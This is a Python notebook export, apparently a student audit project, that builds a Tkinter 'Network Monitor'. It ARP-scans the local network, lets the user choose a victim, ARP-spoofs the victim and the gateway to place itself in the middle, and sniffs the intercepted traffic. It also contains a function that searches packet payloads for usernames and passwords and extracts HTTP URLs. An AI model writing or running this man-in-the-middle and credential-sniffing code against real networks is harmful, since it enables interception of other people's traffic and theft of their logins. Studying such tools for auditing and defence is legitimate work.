#!/usr/bin/env python
# coding: utf-8

# In[1]:


import scapy.all as scapy
from scapy.layers import http
import netifaces
import subprocess
import time
import threading
import argparse
import moc

import tkinter as tk
from tkinter import ttk
from tkinter import *
from tkinter.ttk import *
from tkinter import scrolledtext as st
import sys
from pydub import AudioSegment
from pydub.playback import play
from tkinter import filedialog as fd
from tkinter import messagebox as mb
from playsound import playsound
import time
import moc

class Monitor:
    
    def __init__(self, window):
        # Initializations
        self.ip = StringVar()
        self.mac = StringVar()
        self.layer = StringVar()
        self.wind = window
        self.wind.geometry('1000x600')

        self.wind.title('Network Monitor')
        
        self.labelMonitor = Label(self.wind, text='Seleccionar direccion ip o mac de la tabla')
        self.labelMonitor.place(x=400, y=10)
        
        self.labelIp = Label(self.wind, text='IP: ')
        self.labelIp.place(x=200, y=270)
        #self.labelIp.grid(column=0, row=1)
        self.inputIp = Entry(self.wind, textvariable = self.ip)
        self.inputIp.place(x=250, y=270)
        #self.inputIp.grid(column=1, row=1)
        
        self.labelMac = Label(self.wind, text='MAC: ')
        self.labelMac.place(x=200, y=310)
        #self.labelMac.grid(column=0, row=2)
        self.inputMac = Entry(self.wind, textvariable = self.mac)
        #self.inputMac.grid(column=1, row=2)
        self.inputMac.place(x=250, y=310)
        
        self.labelMac = Label(self.wind, text='Filtrar por: ')
        self.labelMac.place(x=450, y=270)
        
        self.combo = ttk.Combobox(self.wind,state="readonly")
        self.combo["values"] = ["ICMP", "UDP", "TCP", "IP", "HTTP"]
        self.combo.place(x=650, y=270)
   
        self.scrolledtext1=st.ScrolledText(self.wind, width=100, height=10)
        self.scrolledtext1.pack(fill=tk.BOTH, side=tk.LEFT, expand=True)
        self.scrolledtext1.place(x=150, y=380)
        
        print("Gateway: "+ str(self.get_default_gateway()))
        self.scanned_output = self.scan(str(self.get_default_gateway())+'/24')
        self.build_table_IP(self.scanned_output)
        
    def build_table_IP(self, result):
        self.table =ttk.Treeview(self.wind)
        self.table.place(x=400,y=40)
        self.table['columns']=('ip','mac')
        
        self.table.column('#0', width=0, stretch=NO)
        self.table.column('ip', anchor=CENTER, width=120)
        self.table.column('mac', anchor=CENTER, width=150)
        
        self.table.heading('#0',text = '', anchor = CENTER)
        self.table.heading('ip', text = 'Direcciòn IP', anchor = CENTER)
        self.table.heading('mac', text = 'Direcciòn MAC', anchor = CENTER)
        for i in self.result:
            if str(i["ip"]) != str(self.get_default_gateway()):
                self.table.insert(parent='', index=0, text='', values=(i["ip"],i["mac"]))
            
            
        self.table.bind("<Double- 1>", self.select_click_ip_mac)
        
    def load_buttons(self):
        self.ButtonMonitor = Button(text="Monitorizar trafico", command=self.get_spoof_script)
        self.ButtonMonitor.place(x=450, y=340)
        
    def select_click_ip_mac(self, event):
        item = self.table.identify('item',event.x,event.y)
        self.ip.set(self.table.item(item,"values")[0])
        self.mac.set(self.table.item(item,"values")[1])
                                    
    def scan(self,ip):
        self.arp_req_frame = scapy.ARP(pdst = ip)
        self.broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    
        self.broadcast_ether_arp_req_frame = self.broadcast_ether_frame / self.arp_req_frame

        self.answered_list = scapy.srp(self.broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
        self.result = []
        for i in range(0,len(self.answered_list)):
            self.client_dict = {"ip" : self.answered_list[i][1].psrc, "mac" : self.answered_list[i][1].hwsrc}
            self.result.append(self.client_dict)

        return self.result
    
    def print_ip_gateway(self):
        self.gateway = self.get_default_gateway()
        print("Ip: "+ str(self.ip.get()) + " gateway: " + str(self.gateway))
        
    def get_default_gateway(self):        
        self.gateways = netifaces.gateways()
        if 'default' in self.gateways and netifaces.AF_INET in self.gateways['default']:
            return self.gateways['default'][netifaces.AF_INET][0] 
        
    def play(self):
        playsound('/home/kali/Desktop/Develop/final/final-project-audit/alarm-clock.mp3')
    
    def get_spoof_script(self):
        timeObj = time.localtime()
        self.gateway = self.get_default_gateway()
        self.layer.set(self.combo.get())
        hilo = MiHilo(self.ip.get(),self.gateway)
        hilo_sniff = HiloSniffer(self.layer.get(),self.scrolledtext1, timeObj)
        hilo.start()
        hilo_sniff.start()

class MiHilo(threading.Thread):
    
    def __init__(self,victima,gateway):
        threading.Thread.__init__(self)
        self.victima = victima
        self.gateway = gateway
        
    def run(self):
        global sent_packets_count
        sent_packets_count = 0
        try:
            while sent_packets_count <= 20:
                self.spoof(self.gateway, self.victima)
                self.spoof(self.victima, self.gateway)
                sent_packets_count = sent_packets_count + 2
                print("\r[+] Packets Sent: "+str(sent_packets_count))
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
            self.restore(self.victima, self.gateway)
            self.restore(self.gateway, self.victima)
    
    def mac(self,ip):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc
  
    def spoof(self,target_ip, spoof_ip):
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = self.mac(target_ip), psrc = spoof_ip)
        subprocess.check_output(["echo"," 1 > /proc/sys/net/ipv4/ip_forward"])
        scapy.send(packet)  
        
    def restore(self,source_ip, destination_ip):
        source_mac = self.mac(source_ip)
        destination_mac = self.mac(destination_ip)
        restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
        scapy.send(restore_packet, count =1, verbose = False)

        
class HiloSniffer(threading.Thread):   
    
    def __init__(self, layer, scrolledtext1, timeObj):
        threading.Thread.__init__(self)
        self.value = layer
        self.scroll = scrolledtext1
        self.timeObj = timeObj
        
    def run(self):
        self.sniffer("eth0")
    
    def sniffer(self,interface):
        scapy.sniff(iface=interface, store=False, prn=self.sniffed_packet)
    
    def sniffed_packet(self,packet):
        if packet.haslayer(self.value):
            sound = AudioSegment.from_file('/home/kali/Desktop/develop/final-project-audit/Alarm_MAV_Sound.wav',
                                           'wma')
            play(sound)
            self.scroll.insert(tk.INSERT, "\n"+"FILTRO: "+ self.value
                               +"\n" + "IP Destino: " + str(packet['IP'].dst)
                               +"\n"+ "IP Origen: "+ str(packet['IP'].src) 
                               +"\n"+ str(packet.summary())
                               +"\n"+ str('Current TimeStamp is : %d-%d-%d %d:%d:%d' % 
              (self.timeObj.tm_mday, self.timeObj.tm_mon, self.timeObj.tm_year, self.timeObj.tm_hour, 
               self.timeObj.tm_min, self.timeObj.tm_sec))+"\n"+"\n")
            #moc.find_and_play('/home/brandoon/Escritorio/alarm-clock.mp3')
            #credentials = self.credenciales(packet)
            #if credentials:
             #   print('Usuario/Passowrd Ingresados ' + str(credentials) + "\n")
              #  url = self.obt_url(packet)
               # print('URL ' + str(url) + "\n")

    def credenciales(self, packet):
        print('Inicio')
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            ##print(str(load)) 
            keywords = ["email", "username", "user", "login", "pass", "password"]
            for keyword in keywords:
                if keyword in load:
                    return load

    def obt_url(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 
    
if __name__ == '__main__':
    window = tk.Tk()
    application = Monitor(window)
    application.load_buttons()
    window.mainloop()
    